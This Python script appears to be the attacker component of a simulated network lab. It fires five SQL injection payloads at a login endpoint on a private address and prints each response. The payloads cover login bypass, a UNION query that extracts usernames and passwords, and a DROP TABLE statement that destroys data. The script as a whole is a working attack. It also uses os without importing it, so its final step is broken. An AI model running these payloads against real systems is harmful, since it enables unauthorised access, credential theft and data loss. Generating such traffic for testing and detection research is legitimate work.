import requests
import time
import random

def sql_injection_attack(base_url):
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users; --",
        "' OR id = 1; --",
        "admin' --"
    ]

    for payload in payloads:
        url = f"{base_url}/login?username={payload}&password=anything"
        try:
            response = requests.get(url)
            print(f"Attempting SQL injection: {payload}")
            print(f"Response status: {response.status_code}")
            print(f"Response content: {response.text[:100]}...")  # Print first 100 chars
        except Exception as e:
            print(f"Error occurred: {str(e)}")
        time.sleep(random.uniform(1, 3))

if __name__ == "__main__":
    base_url = "http://172.16.238.2"
    sql_injection_attack(base_url)

    simulation_id = os.environ.get('SIMULATION_ID', 'unknown')
    with open(f'/signals/attacker_done_{simulation_id}', 'w') as f:
        f.write('done')